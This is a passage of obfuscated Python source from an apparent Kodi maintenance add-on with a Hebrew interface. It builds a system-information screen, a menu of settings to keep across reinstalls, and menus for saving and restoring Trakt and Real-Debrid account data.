	for OO0OOO00O0OO00OO0 in O0000O0OO0OO0OO0O :#line:2760
		O0OO00O0O0O0O00O0 =wiz .getInfo (OO0OOO00O0OO00OO0 )#line:2761
		OOOOOOO0000OO0OO0 =0 #line:2762
		while O0OO00O0O0O0O00O0 =="Busy"and OOOOOOO0000OO0OO0 <10 :#line:2763
			O0OO00O0O0O0O00O0 =wiz .getInfo (OO0OOO00O0OO00OO0 );OOOOOOO0000OO0OO0 +=1 ;wiz .log ("%s sleep %s"%(OO0OOO00O0OO00OO0 ,str (OOOOOOO0000OO0OO0 )));xbmc .sleep (1000 )#line:2764
		OO00OO0000OO0O0OO .append (O0OO00O0O0O0O00O0 )#line:2765
		OO0O0OO00OOOOOO00 +=1 #line:2766
	O0O0O0O0OOO0OOOOO =OO00OO0000OO0O0OO [8 ]if 'Una'in OO00OO0000OO0O0OO [8 ]else wiz .convertSize (int (float (OO00OO0000OO0O0OO [8 ][:-8 ]))*1024 *1024 )#line:2767
	OOOOOO0OOO00000O0 =OO00OO0000OO0O0OO [9 ]if 'Una'in OO00OO0000OO0O0OO [9 ]else wiz .convertSize (int (float (OO00OO0000OO0O0OO [9 ][:-8 ]))*1024 *1024 )#line:2768
	O000O0000OOO0O0O0 =OO00OO0000OO0O0OO [10 ]if 'Una'in OO00OO0000OO0O0OO [10 ]else wiz .convertSize (int (float (OO00OO0000OO0O0OO [10 ][:-8 ]))*1024 *1024 )#line:2769
	OOOOOOOOO00O00OO0 =wiz .convertSize (int (float (OO00OO0000OO0O0OO [11 ][:-2 ]))*1024 *1024 )#line:2770
	O0O000000O0OO0O00 =wiz .convertSize (int (float (OO00OO0000OO0O0OO [12 ][:-2 ]))*1024 *1024 )#line:2771
	O000O0O0000O00OO0 =wiz .convertSize (int (float (OO00OO0000OO0O0OO [13 ][:-2 ]))*1024 *1024 )#line:2772
	O0O000OO0O0O0O0O0 ,OOO00O000000O00OO ,OO0000OOOO0OO0O0O =getIP ()#line:2773
	O0O0O00OO00O0OOOO =[];OO00OOO0OOOO00000 =[];OOO000O00O0000O00 =[];O0OO00O0000O00OO0 =[];O00O0OOO0OO00O0OO =[];O0O0OO0O0O0OO00O0 =[];O00O000000OO0OOOO =[]#line:2775
	OO0OO0O00O0OO00OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2777
	for OO000OOO000O00OO0 in sorted (OO0OO0O00O0OO00OO ,key =lambda O00O0OO0O0O0O0OO0 :O00O0OO0O0O0O0OO0 ):#line:2778
		O00O00OOOO0000000 =os .path .split (OO000OOO000O00OO0 [:-1 ])[1 ]#line:2779
		if O00O00OOOO0000000 =='packages':continue #line:2780
		OOO000OOOOOOO00OO =os .path .join (OO000OOO000O00OO0 ,'addon.xml')#line:2781
		if os .path .exists (OOO000OOOOOOO00OO ):#line:2782
			O0O0000O00O00OO00 =open (OOO000OOOOOOO00OO )#line:2783
			OO00OO00O0O0OOOO0 =O0O0000O00O00OO00 .read ()#line:2784
			OO000000O000OO00O =re .compile ("<provides>(.+?)</provides>").findall (OO00OO00O0O0OOOO0 )#line:2785
			if len (OO000000O000OO00O )==0 :#line:2786
				if O00O00OOOO0000000 .startswith ('skin'):O00O000000OO0OOOO .append (O00O00OOOO0000000 )#line:2787
				if O00O00OOOO0000000 .startswith ('repo'):O00O0OOO0OO00O0OO .append (O00O00OOOO0000000 )#line:2788
				else :O0O0OO0O0O0OO00O0 .append (O00O00OOOO0000000 )#line:2789
			elif not (OO000000O000OO00O [0 ]).find ('executable')==-1 :O0OO00O0000O00OO0 .append (O00O00OOOO0000000 )#line:2790
			elif not (OO000000O000OO00O [0 ]).find ('video')==-1 :OOO000O00O0000O00 .append (O00O00OOOO0000000 )#line:2791
			elif not (OO000000O000OO00O [0 ]).find ('audio')==-1 :OO00OOO0OOOO00000 .append (O00O00OOOO0000000 )#line:2792
			elif not (OO000000O000OO00O [0 ]).find ('image')==-1 :O0O0O00OO00O0OOOO .append (O00O00OOOO0000000 )#line:2793
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2795
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0000OO0O0OO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2796
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0000OO0O0OO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2797
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2798
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0000OO0O0OO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2799
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0000OO0O0OO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2800
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2802
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0000OO0O0OO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2803
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0000OO0O0OO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2804
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2806
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0O0OOO0OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2807
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOO0OOO00000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2808
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0000OOO0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2809
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2811
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2812
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000O0OO0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2813
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O0000O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2814
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2816
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0000OO0O0OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2817
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000OO0O0O0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2818
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O000000O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2819
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOOO0OO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2820
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0000OO0O0OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2821
	OO00000OO0OOO0OOO =len (O0O0O00OO00O0OOOO )+len (OO00OOO0OOOO00000 )+len (OOO000O00O0000O00 )+len (O0OO00O0000O00OO0 )+len (O0O0OO0O0O0OO00O0 )+len (O00O000000OO0OOOO )+len (O00O0OOO0OO00O0OO )#line:2823
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO00000OO0OOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2824
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000O00O0000O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2825
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO00O0000O00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2826
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OOO0OOOO00000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2827
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O00OO00O0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2828
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0OOO0OO00O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2829
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O000000OO0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2830
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO0O0O0OO00O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2831
def Menu ():#line:2832
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2833
def saveMenu ():#line:2835
	O000000OO0000O0OO ='[COLOR green]מופעל[/COLOR]';OOOOOO000OO0O0OO0 ='[COLOR red]מבוטל[/COLOR]'#line:2837
	OO0O0OO0OO0OO0O0O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2838
	O0000OO000O0OO0O0 ='true'if KEEPMOVIELIST =='true'else 'false'#line:2839
	O00O00OOO00OOOOOO ='true'if KEEPINFO =='true'else 'false'#line:2840
	OOO00OO00OO0OOO00 ='true'if KEEPSOUND =='true'else 'false'#line:2842
	O0000O00O0OO0OO00 ='true'if KEEPVIEW =='true'else 'false'#line:2843
	OOO0OOOO000O00O0O ='true'if KEEPSKIN =='true'else 'false'#line:2844
	O0000OO0O0OOOO0OO ='true'if KEEPSKIN2 =='true'else 'false'#line:2845
	OO0O000O000O0000O ='true'if KEEPSKIN3 =='true'else 'false'#line:2846
	OO000OO00O00000O0 ='true'if KEEPADDONS =='true'else 'false'#line:2847
	O000OO00OOO0OO00O ='true'if KEEPPVR =='true'else 'false'#line:2848
	O0OO000O000OOO000 ='true'if KEEPTVLIST =='true'else 'false'#line:2849
	O000O0OO000OOOOOO ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2850
	OOO000OO0OOOOOOO0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2851
	OO000OO000OO000O0 ='true'if KEEPHUBTV =='true'else 'false'#line:2852
	O000OO00OO000OOO0 ='true'if KEEPHUBVOD =='true'else 'false'#line:2853
	O0000OOO0O000O0O0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:2854
	OO00O0O0OOOO0O00O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2855
	O00OOO00O00O0O00O ='true'if KEEPHUBMENU =='true'else 'false'#line:2856
	O000OOOO0000O0000 ='true'if KEEPPLAYLIST =='true'else 'false'#line:2857
	OO0000OOO0OOOO000 ='true'if KEEPTRAKT =='true'else 'false'#line:2858
	O0000O0O0O00O0O00 ='true'if KEEPREAL =='true'else 'false'#line:2859
	OO0OOO00OO0000O00 ='true'if KEEPRD2 =='true'else 'false'#line:2860
	O0OO0OO0O0000OOO0 ='true'if KEEPTORNET =='true'else 'true'#line:2861
	OO0OOOO0O0OO00OOO ='true'if KEEPLOGIN =='true'else 'false'#line:2862
	O0000O0OO00O00OO0 ='true'if KEEPSOURCES =='true'else 'false'#line:2863
	O00O0O0O000O00OOO ='true'if KEEPADVANCED =='true'else 'false'#line:2864
	OOOO000000O0O00O0 ='true'if KEEPPROFILES =='true'else 'false'#line:2865
	O000O0O0OOOO00000 ='true'if KEEPFAVS =='true'else 'false'#line:2866
	O0000OO0O000OO0OO ='true'if KEEPREPOS =='true'else 'false'#line:2867
	O000O0OOOO00O0OO0 ='true'if KEEPSUPER =='true'else 'false'#line:2868
	OO0O0000O00000000 ='true'if KEEPWHITELIST =='true'else 'false'#line:2869
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2873
	if OO0O0000O00000000 =='true':#line:2874
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2875
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2876
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2877
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2878
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2879
	addFile ('%s התקנת קיר סרטים: '%OO0O0OO0OO0OO0O0O .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2881
	addFile ('%s שמירת חשבון RD: '%O0000O0O0O00O0O00 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2882
	addFile ('%s שמירת חשבון טראקט: '%OO0000OOO0OOOO000 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2883
	addFile ('%s שמירת מועדפים: '%O000O0O0OOOO00000 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2886
	addFile ('%s שמירת לקוח טלוויזיה: '%O000OO00OOO0OO00O .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2887
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%O0OO000O000OOO000 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2888
	addFile ('%s שמירת אריח סרטים: '%O000O0OO000OOOOOO .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2889
	addFile ('%s שמירת אריח סדרות: '%OOO000OO0OOOOOOO0 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2890
	addFile ('%s שמירת אריח טלויזיה: '%OO000OO000OO000O0 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2891
	addFile ('%s שמירת אריח תוכן ישראלי: '%O000OO00OO000OOO0 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2892
	addFile ('%s שמירת אריח ילדים: '%O0000OOO0O000O0O0 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2893
	addFile ('%s שמירת אריח מוסיקה: '%OO00O0O0OOOO0O00O .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2894
	addFile ('%s שמירת תפריט אריחים ראשי: '%O00OOO00O00O0O00O .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2895
	addFile ('%s שמירת כל האריחים בסקין: '%OOO0OOOO000O00O0O .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2896
	addFile ('%s שמירת הרחבות שהתקנתי: '%OO000OO00O00000O0 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2903
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%O00O00OOO00OOOOOO .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2904
	addFile ('%s שמירת ספריית סרטים וסדרות: '%O0000OO000O0OO0O0 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2907
	addFile ('%s שמירת מקורות וידאו: '%O0000O0OO00O00OO0 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2908
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OOO00OO00OO0OOO00 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2909
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O0000O00O0OO0OO00 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2911
	addFile ('%s שמירת פליליסט לאודר: '%O000OOOO0000O0000 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2912
	addFile ('%s שמירת הרחבות ידנית: '%OO0O0000O00000000 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2913
	addFile ('%s שמירת הגדרות באפר: '%O00O0O0O000O00OOO .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2917
	addFile ('%s שמירת סופר מועדפים: '%O000O0OOOO00O0OO0 .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2918
	addFile ('%s שמירת רשימות ריפו: '%O0000OO0O000OO0OO .replace ('true',O000000OO0000O0OO ).replace ('false',OOOOOO000OO0O0OO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2919
	setView ('files','viewType')#line:2921
def traktMenu ():#line:2923
	O0OOOO00OO00O0000 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2924
	OO0O000OO0000O0O0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2925
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2926
	addFile ('Save Trakt Data: %s'%O0OOOO00OO00O0000 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2927
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO0O000OO0000O0O0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2928
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2929
	for O0OOOO00OO00O0000 in traktit .ORDER :#line:2931
		OOO00000OO0OOOOO0 =TRAKTID [O0OOOO00OO00O0000 ]['name']#line:2932
		OOOO0O0000OOO0O0O =TRAKTID [O0OOOO00OO00O0000 ]['path']#line:2933
		O0O000O0O00OO0OOO =TRAKTID [O0OOOO00OO00O0000 ]['saved']#line:2934
		OO0000OOOO00000OO =TRAKTID [O0OOOO00OO00O0000 ]['file']#line:2935
		O00O00000OOOOO0OO =wiz .getS (O0O000O0O00OO0OOO )#line:2936
		OO0OO00O00O0OO0O0 =traktit .traktUser (O0OOOO00OO00O0000 )#line:2937
		OOOO0OO0OOO0OOO00 =TRAKTID [O0OOOO00OO00O0000 ]['icon']if os .path .exists (OOOO0O0000OOO0O0O )else ICONTRAKT #line:2938
		O0O0OO0O0O000OO0O =TRAKTID [O0OOOO00OO00O0000 ]['fanart']if os .path .exists (OOOO0O0000OOO0O0O )else FANART #line:2939
		O0OO0O0O0OOOO0000 =createMenu ('saveaddon','Trakt',O0OOOO00OO00O0000 )#line:2940
		OOO0OO0OOO0OOO0OO =createMenu ('save','Trakt',O0OOOO00OO00O0000 )#line:2941
		O0OO0O0O0OOOO0000 .append ((THEME2 %'%s Settings'%OOO00000OO0OOOOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0OOOO00OO00O0000 )))#line:2942
		addFile ('[+]-> %s'%OOO00000OO0OOOOO0 ,'',icon =OOOO0OO0OOO0OOO00 ,fanart =O0O0OO0O0O000OO0O ,themeit =THEME3 )#line:2944
		if not os .path .exists (OOOO0O0000OOO0O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO0OO0OOO0OOO00 ,fanart =O0O0OO0O0O000OO0O ,menu =O0OO0O0O0OOOO0000 )#line:2945
		elif not OO0OO00O00O0OO0O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0OOOO00OO00O0000 ,icon =OOOO0OO0OOO0OOO00 ,fanart =O0O0OO0O0O000OO0O ,menu =O0OO0O0O0OOOO0000 )#line:2946
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OO00O00O0OO0O0 ,'authtrakt',O0OOOO00OO00O0000 ,icon =OOOO0OO0OOO0OOO00 ,fanart =O0O0OO0O0O000OO0O ,menu =O0OO0O0O0OOOO0000 )#line:2947
		if O00O00000OOOOO0OO =="":#line:2948
			if os .path .exists (OO0000OOOO00000OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0OOOO00OO00O0000 ,icon =OOOO0OO0OOO0OOO00 ,fanart =O0O0OO0O0O000OO0O ,menu =OOO0OO0OOO0OOO0OO )#line:2949
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0OOOO00OO00O0000 ,icon =OOOO0OO0OOO0OOO00 ,fanart =O0O0OO0O0O000OO0O ,menu =OOO0OO0OOO0OOO0OO )#line:2950
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O00000OOOOO0OO ,'',icon =OOOO0OO0OOO0OOO00 ,fanart =O0O0OO0O0O000OO0O ,menu =OOO0OO0OOO0OOO0OO )#line:2951
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2953
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2954
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2955
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2956
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2957
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2958
	setView ('files','viewType')#line:2959
def realMenu ():#line:2961
	O0OO00OOO0OOO0OOO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2962
	OOO0OOO00000O00O0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2963
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2964
	addFile ('Save Real Debrid Data: %s'%O0OO00OOO0OOO0OOO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2965
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOO0OOO00000O00O0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:2966
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2967
	for O0OO0O0OOOO0O00O0 in debridit .ORDER :#line:2969
		O0O0O0O0OO0O000OO =DEBRIDID [O0OO0O0OOOO0O00O0 ]['name']#line:2970
		O0O0OO0O00O00O0OO =DEBRIDID [O0OO0O0OOOO0O00O0 ]['path']#line:2971
		O0O0O00OOO0OOOO00 =DEBRIDID [O0OO0O0OOOO0O00O0 ]['saved']#line:2972
		O00OO0000O00000O0 =DEBRIDID [O0OO0O0OOOO0O00O0 ]['file']#line:2973
		OOO0O00O0OOO00O00 =wiz .getS (O0O0O00OOO0OOOO00 )#line:2974
		OOOO0OO0OOO00OO00 =debridit .debridUser (O0OO0O0OOOO0O00O0 )#line:2975
		O00OO0O000O0O00OO =DEBRIDID [O0OO0O0OOOO0O00O0 ]['icon']if os .path .exists (O0O0OO0O00O00O0OO )else ICONREAL #line:2976
		OOO00OO000OOOOO0O =DEBRIDID [O0OO0O0OOOO0O00O0 ]['fanart']if os .path .exists (O0O0OO0O00O00O0OO )else FANART #line:2977
		O0OOOOO00O00OO000 =createMenu ('saveaddon','Debrid',O0OO0O0OOOO0O00O0 )#line:2978
		OOO0O0O0OO00O0OO0 =createMenu ('save','Debrid',O0OO0O0OOOO0O00O0 )#line:2979
		O0OOOOO00O00OO000 .append ((THEME2 %'%s Settings'%O0O0O0O0OO0O000OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OO0O0OOOO0O00O0 )))#line:2980
		addFile ('[+]-> %s'%O0O0O0O0OO0O000OO ,'',icon =O00OO0O000O0O00OO ,fanart =OOO00OO000OOOOO0O ,themeit =THEME3 )#line:2982
		if not os .path .exists (O0O0OO0O00O00O0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00OO0O000O0O00OO ,fanart =OOO00OO000OOOOO0O ,menu =O0OOOOO00O00OO000 )#line:2983
		elif not OOOO0OO0OOO00OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OO0O0OOOO0O00O0 ,icon =O00OO0O000O0O00OO ,fanart =OOO00OO000OOOOO0O ,menu =O0OOOOO00O00OO000 )#line:2984
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOO0OO0OOO00OO00 ,'authdebrid',O0OO0O0OOOO0O00O0 ,icon =O00OO0O000O0O00OO ,fanart =OOO00OO000OOOOO0O ,menu =O0OOOOO00O00OO000 )#line:2985
		if OOO0O00O0OOO00O00 =="":#line:2986
			if os .path .exists (O00OO0000O00000O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OO0O0OOOO0O00O0 ,icon =O00OO0O000O0O00OO ,fanart =OOO00OO000OOOOO0O ,menu =OOO0O0O0OO00O0OO0 )#line:2987
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OO0O0OOOO0O00O0 ,icon =O00OO0O000O0O00OO ,fanart =OOO00OO000OOOOO0O ,menu =OOO0O0O0OO00O0OO0 )#line:2988
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0O00O0OOO00O00 ,'',icon =O00OO0O000O0O00OO ,fanart =OOO00OO000OOOOO0O ,menu =OOO0O0O0OO00O0OO0 )#line:2989
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2991
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2992
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2993
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2994
